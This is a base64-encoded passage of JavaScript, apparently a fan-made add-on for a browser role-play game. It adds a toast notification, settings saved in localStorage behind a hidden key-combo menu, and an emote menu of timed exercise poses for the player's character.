gICAgIGZ1bmN0aW9uIHNob3dUb2FzdHNjcGcoKSB7CiAgICAgICAgQXVkaW9QbGF5SW5zdGFudFNvdW5kKCJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA5MDUzMDQ3OTA4MzYzMDY3Mi9oNDJ2d2NkLW5vdGlmaWNhdGlvbi0xX3ZNcWhWbHRTLm1wMyIsIDEpOwogICAgICAgIC8vIENyZWF0ZSB0aGUgdG9hc3QgY29udGFpbmVyCiAgICAgICAgdmFyIHRvYXN0Q29udGFpbmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUucG9zaXRpb24gPSAiZml4ZWQiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvdHRvbSA9ICI1cHgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnJpZ2h0ID0gIjVweCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIndoaXRlIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5jb2xvciA9ICIjMTQxNDE0IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5wYWRkaW5nID0gIjVweCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm9yZGVyID0gIjJweCBzb2xpZCAjNENBRjUwIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNXB4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3hTaGFkb3cgPSAiMnB4IDJweCAxMHB4IHJnYmEoMCwgMCwgMCwgMC41KSI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS56SW5kZXggPSAiOTk5IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS50cmFuc2l0aW9uID0gIm9wYWNpdHkgMC41cyBlYXNlLWluLW91dCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmFsaWduSXRlbXMgPSAiY2VudGVyIjsKICAgICAgICB2YXIgc3RhdHVzQmFyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICBzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7CiAgICBzdGF0dXNCYXIuc3R5bGUuaGVpZ2h0ID0gIjNweCI7CiAgICBzdGF0dXNCYXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gImJsYWNrIjsKICAgIHN0YXR1c0Jhci5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CiAgICBzdGF0dXNCYXIuc3R5bGUuYm90dG9tID0gIjAiOwogICAgc3RhdHVzQmFyLnN0eWxlLmxlZnQgPSAiMCI7CiAgICBzdGF0dXNCYXIuc3R5bGUudHJhbnNpdGlvbiA9ICJ3aWR0aCA1cyBlYXNlLWluLW91dCI7CiAgICBzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMCUiOwogICAgdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoc3RhdHVzQmFyKTsKICAgIAogICAgLy8gU3RhdHVzIGJhciB3aWR0aCB3aGlsZSBjb3VudGluZyBkb3duCiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICBzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7CiAgICB9LCAwKTsKICAgIHZhciBpY29uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7CiAgICBpY29uLnNyYyA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwogICAgaWNvbi5zdHlsZS53aWR0aCA9ICIyM3B4IjsKICAgIGljb24uc3R5bGUuaGVpZ2h0ID0gIjIzcHgiOwogICAgaWNvbi5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNTAlIjsKICAgIGljb24uc3R5bGUubWFyZ2luUmlnaHQgPSAiLTMwcHgiOwogICAgaWNvbi5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiLTVweCI7CiAgICB0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChpY29uKTsKICAgIHZhciB0ZXh0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3BhbiIpOwogICAgdGV4dC5zdHlsZS5mb250V2VpZ2h0ID0gImJvbGQiOwogICAgdGV4dC5zdHlsZS5tYXJnaW5MZWZ0ID0gIjM1cHgiOwogICAgdGV4dC5pbm5lckhUTUwgPSAiQWN0aW9uIFN1Y2Nlc3NmdWxseSBFeGVjdXRlZCI7CiAgICB0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZCh0ZXh0KTsKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQodG9hc3RDb250YWluZXIpOwogICAgICAKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjEiOwogICAgICAgIH0sIDApOwogICAgICAKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICAgICAgICB9LCA1MDAwKTsKICAgICAgCiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgICAgfSwgNTUwMCk7CiAgICAgICAgc2VuZEZkZWJ1ZygpOwogICAgCiAgICAgIH0KCiAgICB9CiAgfQoKICBpZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oIm9wdGlvbjEiKSAhPT0gbnVsbCkgewogICAgY2hlY2tib3gxLmNoZWNrZWQgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgib3B0aW9uMSIpID09PSAidHJ1ZSI7CiAgICBpZiAoY2hlY2tib3gxLmNoZWNrZWQpIHsKICAgICAgc2V0SW50ZXJ2YWwocnVuT3B0aW9uMSwgMTAwMCk7CiAgICB9CiAgfQogIAogIGlmIChsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgib3B0aW9uMiIpICE9PSBudWxsKSB7CiAgICBjaGVja2JveDIuY2hlY2tlZCA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJvcHRpb24yIikgPT09ICJ0cnVlIjsKICAgIGlmIChjaGVja2JveDIuY2hlY2tlZCkgewogICAgICBzZXRJbnRlcnZhbChydW5PcHRpb24yLCAxMDAwKTsKICAgIH0KICB9CgogIGlmIChsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgib3B0aW9uMyIpICE9PSBudWxsKSB7CiAgICBjaGVja2JveDMuY2hlY2tlZCA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJvcHRpb24zIikgPT09ICJ0cnVlIjsKICAgIGlmIChjaGVja2JveDMuY2hlY2tlZCkgewogICAgICBzZXRJbnRlcnZhbChydW5PcHRpb24zLCAxMDAwKTsKICAgIH0KICB9CiAgCiAgY2hlY2tib3gxLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogICAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oIm9wdGlvbjEiLCBjaGVja2JveDEuY2hlY2tlZCk7CiAgICBpZiAoY2hlY2tib3gxLmNoZWNrZWQpIHsKICAgICAgc2V0SW50ZXJ2YWwocnVuT3B0aW9uMSwgMTAwMCk7CiAgICB9CiAgfSk7CiAgCiAgY2hlY2tib3gyLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogICAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oIm9wdGlvbjIiLCBjaGVja2JveDIuY2hlY2tlZCk7CiAgICBpZiAoY2hlY2tib3gyLmNoZWNrZWQpIHsKICAgICAgc2V0SW50ZXJ2YWwocnVuT3B0aW9uMiwgMTAwMCk7CiAgICB9CiAgfSk7CgogIGNoZWNrYm94My5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJvcHRpb24zIiwgY2hlY2tib3gzLmNoZWNrZWQpOwogICAgaWYgKGNoZWNrYm94My5jaGVja2VkKSB7CiAgICAgIHNldEludGVydmFsKHJ1bk9wdGlvbjMsIDEwMDApOwogICAgfQogIH0pOwogIAoKLy9PcHRpb25zIFN0YXRlc19fX19fX19fX19fX19fX19fX19fX19fX19fX19fCgpjaGVja2JveDEuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oIm9wdGlvbjEiLCBjaGVja2JveDEuY2hlY2tlZCk7Cn0pOwoKY2hlY2tib3gyLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJvcHRpb24yIiwgY2hlY2tib3gyLmNoZWNrZWQpOwp9KTsKCmNoZWNrYm94My5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgib3B0aW9uMyIsIGNoZWNrYm94My5jaGVja2VkKTsKfSk7CgoKZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzZXR0aW5nc01lbnUpOwoKbGV0IGlzQmFja3RpY2tQcmVzc2VkID0gZmFsc2U7CmxldCBpc1NQcmVzc2VkID0gZmFsc2U7Cgpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXlkb3duIiwgZnVuY3Rpb24oZXZlbnQpIHsKICBpZiAoZXZlbnQua2V5ID09PSAiYCIpIHsKICAgIGlzQmFja3RpY2tQcmVzc2VkID0gdHJ1ZTsKICB9IGVsc2UgaWYgKGV2ZW50LmtleSA9PT0gInMiKSB7CiAgICBpc1NQcmVzc2VkID0gdHJ1ZTsKICB9CgogIGlmIChpc0JhY2t0aWNrUHJlc3NlZCAmJiBpc1NQcmVzc2VkKSB7CiAgICBzZXR0aW5nc01lbnUuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgfQp9KTsKCi8vIEhpZGUgc2V0dGluZ3MgbWVudSB3aGVuIHVzZXIgY2xpY2tzIG9mZgpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgICBjb25zdCB0YXJnZXRFbGVtZW50ID0gZXZlbnQudGFyZ2V0OwogICAgY29uc3QgaXNTZXR0aW5nc01lbnUgPSAhIXRhcmdldEVsZW1lbnQuY2xvc2VzdCgiI3NldHRpbmdzLW1lbnUiKTsKICAgIAogICAgaWYgKCFpc1NldHRpbmdzTWVudSkgewogICAgICBzZXR0aW5nc01lbnUuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgIH0KICB9KTsKICAKICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXl1cCIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgaWYgKGV2ZW50LmtleSA9PT0gImAiKSB7CiAgICBpc0JhY2t0aWNrUHJlc3NlZCA9IGZhbHNlOwogIH0gZWxzZSBpZiAoZXZlbnQua2V5ID09PSAicyIpIHsKICAgIGlzU1ByZXNzZWQgPSBmYWxzZTsKICB9Cn0pOwoKCi8vRW5kIG9mIFBlcnNpc3RhbnQgTWVudSBfX19fX19fX19fX19fX19fX19fX18KCi8vU3RhcnQgb2YgRW1vdGUgTWVudSBfX19fX19fX19fX19fX19fX19fX18KCmNvbnN0IGJ1dHRvbkRhdGEgPSBbCiAgeyBuYW1lOiAiUHVsbC1VcHMiLCBhY3Rpb246ICgpID0+IHsKICAgICAgICBzaG93VG9hc3RzY3BnKCk7CiAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiTGVnc09wZW4iKTsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJPdmVyVGhlSGVhZCIpOwogICAgICAgICAgICBJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHsKICAgICAgICAgICAgICAgIEhlaWdodDogMTMwCiAgICAgICAgICAgIH07CiAgICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgICAgfSwgMTAwMCk7CiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJZb2tlZCIpOwogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkxlZ3NDbG9zZWQiKTsKICAgICAgICAgICAgSW52ZW50b3J5R2V0KFBsYXllciwgIkVtb3RpY29uIikuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQgPSB7CiAgICAgICAgICAgICAgICBIZWlnaHQ6IDI1MAogICAgICAgICAgICB9OwogICAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICAgIH0sIDIwMDApOwogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CgogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkxlZ3NPcGVuIik7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiT3ZlclRoZUhlYWQiKQogICAgICAgICAgICBJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHsKICAgICAgICAgICAgICAgIEhlaWdodDogMTMwCiAgICAgICAgICAgIH07CiAgICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgICAgfSwgMzAwMCk7CiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJZb2tlZCIpOwogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkxlZ3NDbG9zZWQiKTsKICAgICAgICAgICAgSW52ZW50b3J5R2V0KFBsYXllciwgIkVtb3RpY29uIikuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQgPSB7CiAgICAgICAgICAgICAgICBIZWlnaHQ6IDI1MAogICAgICAgICAgICB9OwogICAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAnQ2hhdFJvb20nID8KICAgICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICAgIH0sIDQwMDApOyAgICAKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkxlZ3NPcGVuIik7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiT3ZlclRoZUhlYWQiKQogICAgICAgICAgICBJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHsKICAgICAgICAgICAgICAgIEhlaWdodDogMTMwCiAgICAgICAgICAgIH07CiAgICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgICAgfSwgNTAwMCk7CiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgICAgICBkZWxldGUgSW52ZW50b3J5R2V0KFBsYXllciwgJ0Vtb3RpY29uJykuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQ7CiAgICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICdDaGF0Um9vbScgPwogICAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgICAgfSwgNjAwMCk7ICAgIAp9IH0sCiAgeyBuYW1lOiAiQ2hlZXIiLCBhY3Rpb246ICgpID0+IHsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIllva2VkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDEwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJPdmVyVGhlSGVhZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCAyMDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiWW9rZWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgMzAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIk92ZXJUaGVIZWFkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDQwMDApOyAgICAKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiWW9rZWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgNTAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIk92ZXJUaGVIZWFkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDYwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gJ0NoYXRSb29tJyA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA3MDAwKTsgfSB9LAogIHsgbmFtZTogIkp1bXBpbmcgSmFja3MiLCBhY3Rpb246ICgpID0+IHsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHsKICAgICAgICAgICAgICBIZWlnaHQ6IDE1MAogICAgICAgICAgfTsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiTGVnc09wZW4iKTsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiT3ZlclRoZUhlYWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgMTAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHVuZGVmaW5lZDsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiTGVnc0Nsb3NlZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCAyMDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIEludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICAgICAgICAgIEhlaWdodDogMTUwCiAgICAgICAgICB9OwogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJMZWdzT3BlbiIpOwogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJPdmVyVGhlSGVhZCIpCiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDMwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgICAgZGVsZXRlIEludmVudG9yeUdldChQbGF5ZXIsICdFbW90aWNvbicpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0OwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gJ0NoYXRSb29tJyA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA0MDAwKTsgICAgIH0gfSwKICB7IG5hbWU6ICJCdXJwZWVzIiwgYWN0aW9uOiAoKSA9PiB7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkhvZ3RpZWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgMTAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDIwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJZb2tlZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCAzMDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgNDAwMCk7ICAgIAogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJIb2d0aWVkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDUwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgICAgQ3VycmVudFNjcmVl